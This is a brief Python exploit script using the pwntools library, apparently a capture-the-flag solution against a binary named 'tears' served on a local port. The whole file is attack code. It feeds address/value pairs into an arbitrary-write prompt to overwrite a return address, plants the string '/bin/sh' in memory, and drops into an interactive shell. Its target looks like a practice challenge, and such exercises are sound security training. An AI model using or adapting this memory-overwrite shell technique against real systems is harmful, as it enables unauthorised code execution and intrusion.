from pwn import *
context.log_level = 'debug'
#p = process('./tears')
p = remote('127.0.0.1', 2335)

def send(index, value):
	p.recvuntil('Eye  >')
	p.sendline(index)
	p.recvuntil('Tear >')
	p.sendline(str(value))

send('0xffffcffc', 0x0804883c)   
#send('0xffffcfac', 0x0804883c)
#send('0xffffcfac', 0x0804883c)
send('0x080bb868', 0x6e69622f)  # 'nib/'
send('0x080bb86c', 0x2068732f)  # ' hs/'
#p.recv()
p.interactive()
